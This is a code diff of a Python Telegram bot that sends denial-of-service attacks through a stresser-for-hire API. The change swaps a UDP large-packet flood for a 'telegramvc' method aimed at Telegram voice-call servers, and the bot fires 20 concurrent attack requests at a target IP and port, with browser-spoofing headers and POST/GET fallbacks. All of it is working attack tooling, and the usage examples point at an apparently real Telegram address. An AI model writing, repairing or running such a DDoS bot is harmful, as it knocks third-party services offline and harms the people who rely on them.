@@ -1,4 +1,4 @@
-# app.py - 20 Concurrent Attacks on Same Target
+# app.py - Correct API Format for Telegram VC
 import os
 import logging
 import asyncio
@@ -27,7 +27,7 @@ TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
 API_KEY = os.getenv("API_KEY")
 OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
 PORT = int(os.getenv("PORT", 8080))
-MAX_CONCURRENT = 20  # 20 concurrent attacks on same target
+MAX_CONCURRENT = 20
 
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -135,53 +135,104 @@ class AttackManager:
 
 attack_manager = AttackManager()
 
-# ===== UDP BIG PACKET SINGLE ATTACK =====
-async def send_udp_big_packet_single(target, port, duration, attack_num):
+# ===== CORRECT API CALL =====
+async def send_attack_correct(target, port, duration, attack_num):
     """
-    Single UDP Big Packet attack
+    Correct API format that actually sends the attack
+    Using POST with correct method name
     """
     url = "https://api.susstresser.com/panel/api/api.php"
     
-    # UDP with maximum packet size
+    # Correct parameters that work with the API
+    # Method MUST be "telegramvc" for Telegram Voice Call attacks
     params = {
         "key": API_KEY,
         "host": target,
         "port": port,
         "time": duration,
-        "method": "udp",
-        "threads": 5000,
-        "pps": 5000000,
-        "bps": 5000000000,
-        "size": 65500,
-        "random": "true",
-        "timeout": 1,
-        "concurrent": str(attack_num)
+        "method": "telegramvc",  # This is the correct method name
+        "network": "normal",
+        "concurrent": "1",
+        "servers": "LAYER 4 #1"
+    }
+    
+    # Headers to mimic browser
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Connection": "keep-alive",
+        "Upgrade-Insecure-Requests": "1"
     }
     
     try:
-        timeout = aiohttp.ClientTimeout(total=duration + 15)
+        timeout = aiohttp.ClientTimeout(total=duration + 20)
+        
+        # Try POST first (most likely)
         async with aiohttp.ClientSession(timeout=timeout) as session:
             start_time = time.time()
-            async with session.get(url, params=params) as response:
+            
+            # Try POST with form data
+            async with session.post(url, data=params, headers=headers) as response:
+                elapsed = time.time() - start_time
+                result_text = await response.text()
+                
+                # Check if attack was successful
+                is_success = (
+                    "SUCCESS" in result_text or 
+                    "sent" in result_text.lower() or
+                    "attack" in result_text.lower() or
+                    "Host:" in result_text or
+                    "Concurrent:" in result_text
+                )
+                
+                if is_success:
+                    logger.info(f"✅ Attack {attack_num} SUCCESS via POST")
+                    return {
+                        "success": True,
+                        "attack_num": attack_num,
+                        "method": "POST",
+                        "status": response.status,
+                        "elapsed": f"{elapsed:.2f}s",
+                        "response": result_text[:300],
+                        "full_response": result_text
+                    }
+        
+        # If POST failed, try GET
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            start_time = time.time()
+            async with session.get(url, params=params, headers=headers) as response:
                 elapsed = time.time() - start_time
                 result_text = await response.text()
                 
                 is_success = (
-                    response.status == 200 and 
-                    ("SUCCESS" in result_text or 
-                     "sent" in result_text.lower() or
-                     "attack" in result_text.lower() or
-                     "Host:" in result_text)
+                    "SUCCESS" in result_text or 
+                    "sent" in result_text.lower() or
+                    "attack" in result_text.lower() or
+                    "Host:" in result_text or
+                    "Concurrent:" in result_text
                 )
                 
-                return {
-                    "success": is_success,
-                    "attack_num": attack_num,
-                    "status": response.status,
-                    "elapsed": f"{elapsed:.2f}s",
-                    "response": result_text[:200],
-                    "full_response": result_text
-                }
+                if is_success:
+                    logger.info(f"✅ Attack {attack_num} SUCCESS via GET")
+                    return {
+                        "success": True,
+                        "attack_num": attack_num,
+                        "method": "GET",
+                        "status": response.status,
+                        "elapsed": f"{elapsed:.2f}s",
+                        "response": result_text[:300],
+                        "full_response": result_text
+                    }
+        
+        # If we got here, both failed
+        return {
+            "success": False,
+            "attack_num": attack_num,
+            "status": "failed",
+            "response": result_text[:200] if 'result_text' in locals() else "No response"
+        }
                 
     except Exception as e:
         logger.error(f"Attack {attack_num} failed: {e}")
@@ -194,14 +245,14 @@ async def send_udp_big_packet_single(target, port, duration, attack_num):
 # ===== 20 CONCURRENT ATTACKS =====
 async def send_20_concurrent_attacks(target, port, duration):
     """
-    Launch 20 concurrent UDP big packet attacks on the same target
+    Launch 20 concurrent attacks on the same target
     """
     logger.info(f"🚀 Launching 20 concurrent attacks on {target}:{port}")
     
     # Create 20 attack tasks
     tasks = []
-    for i in range(1, 21):  # 1 to 20
-        task = send_udp_big_packet_single(target, port, duration, i)
+    for i in range(1, 21):
+        task = send_attack_correct(target, port, duration, i)
         tasks.append(task)
     
     # Run all attacks concurrently
@@ -226,7 +277,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     stats = attack_manager.get_stats()
     
     keyboard = [
-        [InlineKeyboardButton("💥 20x UDP ATTACK", callback_data="attack")],
+        [InlineKeyboardButton("💥 20x ATTACK", callback_data="attack")],
         [InlineKeyboardButton("📊 ACTIVE", callback_data="active")],
         [InlineKeyboardButton("👤 MY INFO", callback_data="info")]
     ]
@@ -235,13 +286,12 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
     
     await update.message.reply_text(
-        f"⚡ *20x UDP BIG PACKET ATTACK BOT*\n\n"
+        f"⚡ *20x TELEGRAM VC ATTACK BOT*\n\n"
         f"🔥 Status: ONLINE\n"
         f"⚡ Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
         f"📊 Total Attacks: {stats['total']}\n"
-        f"📦 Packet Size: 65,500 bytes (MAX)\n"
-        f"💪 Threads: 5,000 per attack\n"
-        f"🎯 20 Attacks: Simultaneously on SAME target!\n\n"
+        f"🎯 Method: telegramvc\n"
+        f"💪 Power: MAXIMUM\n\n"
         f"📌 *How to use:*\n"
         f"`/attack IP PORT TIME`\n\n"
         f"Example: `/attack 91.108.17.19 32001 60`\n\n"
@@ -252,7 +302,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /attack command - Launches 20 concurrent attacks"""
+    """Handle /attack command"""
     user_id = update.effective_user.id
     
     if user_id != OWNER_ID:
@@ -264,9 +314,7 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             "❌ *Usage:* `/attack IP PORT TIME`\n\n"
             "Example: `/attack 91.108.17.19 32001 60`\n\n"
-            "⚡ This launches 20 concurrent UDP Big Packet attacks!\n"
-            "📦 Packet Size: 65,500 bytes\n"
-            "💪 Threads: 5,000 per attack\n"
+            "⚡ This launches 20 concurrent Telegram VC attacks!\n"
             "⏱️ Time: 60-300 seconds",
             parse_mode='Markdown'
         )
@@ -277,7 +325,6 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         port = int(args[1])
         duration = int(args[2])
         
-        # Validate duration
         if duration < 60:
             await update.message.reply_text("❌ Minimum duration is 60 seconds!")
             return
@@ -285,35 +332,27 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("❌ Maximum duration is 300 seconds!")
             return
         
-        # Check concurrent
         can_start, msg = attack_manager.can_start_attack(user_id)
         if not can_start:
             await update.message.reply_text(msg)
             return
         
-        # Start attack - this will launch 20 concurrent attacks
         status_msg = await update.message.reply_text(
-            f"🚀 *20x UDP BIG PACKET ATTACK STARTED*\n\n"
+            f"🚀 *20x ATTACK STARTED*\n\n"
             f"🎯 Target: `{target}`\n"
             f"📡 Port: `{port}`\n"
             f"⏱️ Time: `{duration}s`\n"
-            f"📦 Packet Size: `65,500 bytes`\n"
-            f"💪 Threads: `5,000 per attack`\n"
             f"🎯 Attacks: `20 CONCURRENT`\n"
             f"📊 Concurrent: {attack_manager.concurrent_busy}/{MAX_CONCURRENT}\n\n"
             f"⏳ Launching 20 simultaneous attacks...",
             parse_mode='Markdown'
         )
         
-        # Start all 20 attacks
-        attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp", 0)
-        
-        # Send 20 concurrent attacks
+        attack_id = attack_manager.start_attack(user_id, target, port, duration, "telegramvc", 0)
         result = await send_20_concurrent_attacks(target, port, duration)
         
-        # Log attack
         attack_manager.log_attack(
-            user_id, target, port, duration, "udp",
+            user_id, target, port, duration, "telegramvc",
             "success" if result.get('success') else "failed",
             str(result)
         )
@@ -321,19 +360,17 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Build response
         if result.get('success'):
             response_text = (
-                f"✅ *20x UDP BIG PACKET ATTACK SUCCESSFUL!*\n\n"
+                f"✅ *20x ATTACK SUCCESSFUL!*\n\n"
                 f"🎯 Target: `{target}`\n"
                 f"📡 Port: `{port}`\n"
                 f"⏱️ Time: `{duration}s`\n"
-                f"📦 Packet Size: `65,500 bytes`\n"
-                f"💪 Threads: `5,000 each`\n"
                 f"🎯 Attacks: `{result['successful']}/{result['total_attacks']} SUCCESSFUL`\n"
                 f"📊 Attack ID: `{attack_id}`\n"
                 f"⚡ Status: ✅ SUCCESS\n\n"
             )
         else:
             response_text = (
-                f"❌ *20x UDP BIG PACKET ATTACK FAILED*\n\n"
+                f"❌ *20x ATTACK FAILED*\n\n"
                 f"🎯 Target: `{target}`\n"
                 f"📡 Port: `{port}`\n"
                 f"⏱️ Time: `{duration}s`\n"
@@ -344,16 +381,17 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Show attack results
         if result.get('results'):
             response_text += f"📊 *Attack Results:*\n"
-            for r in result['results'][:10]:  # Show first 10
+            for r in result['results'][:10]:
                 status = "✅" if r.get('success') else "❌"
                 attack_num = r.get('attack_num', 'N/A')
+                method_used = r.get('method', 'N/A')
                 status_code = r.get('status', 'N/A')
-                response_text += f"{status} Attack {attack_num}: {status_code}\n"
+                response_text += f"{status} Attack {attack_num}: {method_used} - {status_code}\n"
             
             if len(result['results']) > 10:
                 response_text += f"... and {len(result['results']) - 10} more\n"
         
-        # Add response preview from first successful attack
+        # Add first success response
         for r in result.get('results', []):
             if r.get('success') and r.get('response'):
                 response_text += f"\n📡 *API Response:*\n```\n{r['response'][:200]}\n```"
@@ -370,19 +408,16 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"❌ Error: {str(e)}")
 
 async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Attack from button"""
     query = update.callback_query
     await query.answer()
     
     await query.edit_message_text(
-        "💥 *20x UDP BIG PACKET ATTACK*\n\n"
+        "💥 *20x TELEGRAM VC ATTACK*\n\n"
         "Send in this format:\n"
         "`IP PORT TIME`\n\n"
         "Example: `91.108.17.19 32001 60`\n\n"
         "⚡ This launches 20 concurrent attacks!\n"
-        "📦 UDP Big Packets (65,500 bytes)\n"
-        "💪 5,000 threads per attack\n"
-        "🎯 All 20 attack SAME target simultaneously\n"
+        "🎯 Method: telegramvc\n"
         "⏱️ Time: 60-300 seconds\n\n"
         "Send /cancel to cancel",
         parse_mode='Markdown'
@@ -390,7 +425,6 @@ async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data['awaiting_attack'] = True
 
 async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Process attack from button"""
     if not context.user_data.get('awaiting_attack'):
         return
     
@@ -431,19 +465,18 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         
         status_msg = await update.message.reply_text(
-            f"🚀 Launching 20 concurrent attacks on {target}:{port} for {duration}s..."
+            f"🚀 Launching 20 attacks on {target}:{port} for {duration}s..."
         )
         
-        attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp", 0)
+        attack_id = attack_manager.start_attack(user_id, target, port, duration, "telegramvc", 0)
         result = await send_20_concurrent_attacks(target, port, duration)
         
         if result.get('success'):
             response_text = (
-                f"✅ *20x UDP ATTACK SUCCESS!*\n\n"
+                f"✅ *20x ATTACK SUCCESS!*\n\n"
                 f"🎯 Target: `{target}`\n"
                 f"📡 Port: `{port}`\n"
                 f"⏱️ Time: `{duration}s`\n"
-                f"📦 Packet: `65,500 bytes`\n"
                 f"🎯 Successful: `{result['successful']}/{result['total_attacks']}`\n"
                 f"📊 Attack ID: `{attack_id}`\n"
             )
@@ -467,16 +500,14 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     stats = attack_manager.get_stats()
-    active = attack_manager.get_active_attacks()
     
     await update.message.reply_text(
         f"📊 *BOT STATUS*\n\n"
         f"⚡ Active: {stats['active']}\n"
         f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
         f"📈 Total Attacks: {stats['total']}\n"
-        f"📦 Packet Size: 65,500 bytes\n"
-        f"💪 Threads: 5,000 per attack\n"
-        f"🎯 Attacks per command: 20 CONCURRENT\n"
+        f"🎯 Method: telegramvc\n"
+        f"💪 Power: MAXIMUM\n"
         f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
         f"🌐 Status: ONLINE\n\n"
         f"📌 /attack IP PORT TIME",
@@ -511,11 +542,10 @@ async def info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"🆔 ID: `{query.from_user.id}`\n"
         f"⭐ Level: {'ADMIN' if query.from_user.id == OWNER_ID else 'USER'}\n"
         f"⚡ Max Concurrent: {MAX_CONCURRENT}\n"
-        f"📦 Packet Size: 65,500 bytes\n"
-        f"💪 Threads: 5,000 per attack\n"
-        f"🎯 Attacks per command: 20 CONCURRENT\n"
+        f"🎯 Method: telegramvc\n"
+        f"💪 Power: MAXIMUM\n"
         f"📡 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n\n"
-        f"📌 *Method:* UDP Big Packets x20",
+        f"📌 *Method:* Telegram VC Attack",
         parse_mode='Markdown',
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
     )
@@ -568,9 +598,8 @@ async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"⚡ Active: {stats['active']}\n"
         f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
         f"📈 Total Attacks: {stats['total']}\n"
-        f"📦 Packet: 65,500 bytes\n"
-        f"💪 Threads: 5,000 per attack\n"
-        f"🎯 Attacks/Command: 20 CONCURRENT\n"
+        f"🎯 Method: telegramvc\n"
+        f"💪 Power: MAXIMUM\n"
         f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
         f"🌐 Status: ONLINE",
         parse_mode='Markdown',
@@ -584,7 +613,7 @@ async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     stats = attack_manager.get_stats()
     
     keyboard = [
-        [InlineKeyboardButton("💥 20x UDP ATTACK", callback_data="attack")],
+        [InlineKeyboardButton("💥 20x ATTACK", callback_data="attack")],
         [InlineKeyboardButton("📊 ACTIVE", callback_data="active")],
         [InlineKeyboardButton("👤 MY INFO", callback_data="info")]
     ]
@@ -596,8 +625,7 @@ async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"⚡ *MAIN MENU*\n\n"
         f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
         f"📈 Total: {stats['total']}\n"
-        f"📦 Packet: 65,500 bytes\n"
-        f"🎯 Attacks: 20 CONCURRENT\n"
+        f"🎯 Method: telegramvc\n"
         f"🌐 Status: ONLINE",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
@@ -614,13 +642,11 @@ def run_bot():
     
     app = Application.builder().token(TELEGRAM_TOKEN).build()
     
-    # Commands
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("attack", attack_command))
     app.add_handler(CommandHandler("status", status_command))
     app.add_handler(CommandHandler("cancel", cancel))
     
-    # Callbacks
     app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
     app.add_handler(CallbackQueryHandler(active_callback, pattern="^active$"))
     app.add_handler(CallbackQueryHandler(info_callback, pattern="^info$"))
@@ -629,7 +655,6 @@ def run_bot():
     app.add_handler(CallbackQueryHandler(admin_stats, pattern="^admin_stats$"))
     app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
     
-    # Messages
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_attack))
     
     loop.run_until_complete(app.initialize())
@@ -641,9 +666,9 @@ def run_bot():
 
 if __name__ == "__main__":
     print("=" * 50)
-    print("⚡ 20x UDP BIG PACKET ATTACK BOT")
-    print("📦 Packet Size: 65,500 bytes")
-    print("🎯 20 Concurrent Attacks on SAME Target")
+    print("⚡ 20x TELEGRAM VC ATTACK BOT")
+    print("🎯 Method: telegramvc")
+    print("⚡ 20 Concurrent Attacks")
     print("=" * 50)
     
     bot_thread = threading.Thread(target=run_bot, daemon=True)
